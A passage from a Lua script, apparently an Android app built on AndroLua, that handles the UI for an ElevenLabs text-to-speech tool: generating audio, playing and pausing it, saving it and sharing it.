        if currentVoiceId == "" then updateGenerateStatus("Please select a valid voice", true) return end
        
        local usedTokens = luajava.bindClass("java.lang.String")(text).length()
        _G.generateAudioButton.setEnabled(false)
        _G.generateAudioButton.setText("GENERATING...")
        updateGenerateStatus("Generating audio, please wait...", false)
        
        local selectedMode = modeMap[modes[_G.modeSpinner.getSelectedItemPosition() + 1]]
        local selectedModel = getSavedModel()
        
        toggleAudioControls(false)
        currentFilePath = nil
        currentSeekPosition = 0
        runOnUi(function() _G.tokensUsedText.setVisibility(View.GONE) end)
        
        generateElevenLabsAudio(text, currentVoiceId, selectedModel, selectedMode, selectedMode, function(audioData, error)
            runOnUi(function()
                _G.generateAudioButton.setEnabled(true)
                if error then
                    _G.generateAudioButton.setText("GENERATE AUDIO")
                    updateGenerateStatus("Error: " .. tostring(error), true)
                    toggleAudioControls(false)
                else
                    _G.generateAudioButton.setText("REGENERATE")
                    currentAudioData = audioData
                    updateGenerateStatus("✓ Audio generated successfully!", false)
                    _G.tokensUsedText.setText("Tokens used: " .. tostring(usedTokens))
                    _G.tokensUsedText.setVisibility(View.VISIBLE)
                    toggleAudioControls(true)
                    
                    local tempFile = File(this.getCacheDir(), "temp_audio.mp3")
                    writeToFile(tempFile.getPath(), audioData)
                    currentFilePath = tempFile.getPath()
                    _G.playPauseAudioButton.tag = currentFilePath
                    currentSeekPosition = 0
                    initMediaPlayer()
                end
            end)
        end)
    end

    _G.playPauseAudioButton.onClick = function()
        local audioFilePath = _G.playPauseAudioButton.tag
        if audioFilePath then
            if not mediaPlayer then initMediaPlayer() end
            local isPlaying = false
            pcall(function() isPlaying = mediaPlayer.isPlaying() end)
            
            if isPlaying then
                pcall(function() mediaPlayer.pause() end)
                _G.playPauseAudioButton.text = "PLAY AUDIO"
                local currentPos = 0
                pcall(function() currentPos = mediaPlayer.getCurrentPosition() end)
                updateGenerateStatusSilent("Audio paused at " .. math.floor(currentPos/1000) .. " seconds", false)
            else
                pcall(function()
                    if mediaPlayer then
                        if mediaPlayer.isPlaying() then mediaPlayer.stop() end
                        mediaPlayer.reset()
                    end
                end)
                if safePrepareMediaPlayer(audioFilePath) then
                    if currentSeekPosition > 0 then pcall(function() mediaPlayer.seekTo(currentSeekPosition) end) end
                    pcall(function() mediaPlayer.start() end)
                    _G.playPauseAudioButton.text = "PAUSE AUDIO"
                    local currentPos = 0
                    pcall(function() currentPos = mediaPlayer.getCurrentPosition() end)
                    updateGenerateStatusSilent("Playing audio from " .. math.floor(currentPos/1000) .. " seconds", false)
                    pcall(function()
                        mediaPlayer.setOnCompletionListener(MediaPlayer.OnCompletionListener {
                            onCompletion = function()
                                runOnUi(function() _G.playPauseAudioButton.text = "PLAY AUDIO"; currentSeekPosition = 0 end)
                                updateGenerateStatusSilent("Playback finished", false)
                            end
                        })
                    end)
                else
                    updateGenerateStatusSilent("Error: Cannot play audio file", true)
                end
            end
        else updateGenerateStatusSilent("No audio available", true) end
    end

    _G.rewindButton.onClick = function() rewindAudio() end
    _G.forwardButton.onClick = function() forwardAudio() end
    
    _G.downloadButton.onClick = function()
        local fileName = _G.fileNameInput.getText().toString()
        if currentAudioData then
            local savedPath = saveAudioToFile(currentAudioData, fileName)
            if savedPath then updateGenerateStatus("Saved to: " .. savedPath, false) else updateGenerateStatus("Failed to save", true) end
        else updateGenerateStatus("No audio to save", true) end
    end
    
    _G.shareButton.onClick = function()
        if currentAudioData then shareAudioFile(currentAudioData, _G.fileNameInput.getText().toString()) else updateGenerateStatus("No audio to share", true) end
    end
    
    _G.settingsButton.onClick = function() showSettingsDialog() end
    
    _G.joinUsButton.onClick = function()
        if loadedHelpFunc then
            pcall(loadedHelpFunc)
        else
            showToast("Loading, please wait...")
        end
    end
    
    _G.watchTutorialButton.onClick = function() showWatchTutorialDialog() end
    
    _G.exitButton.onClick = function()
        pcall(function()
            if mediaPlayer and mediaPlayer.isPlaying() then mediaPlayer.stop() end
            if mediaPlayer then mediaPlayer.release() end
        end)
        dlg.dismiss()
    end
end

-- MAIN EXECUTION
createMainDialog()
startPreloadSequence()
checkUpdate()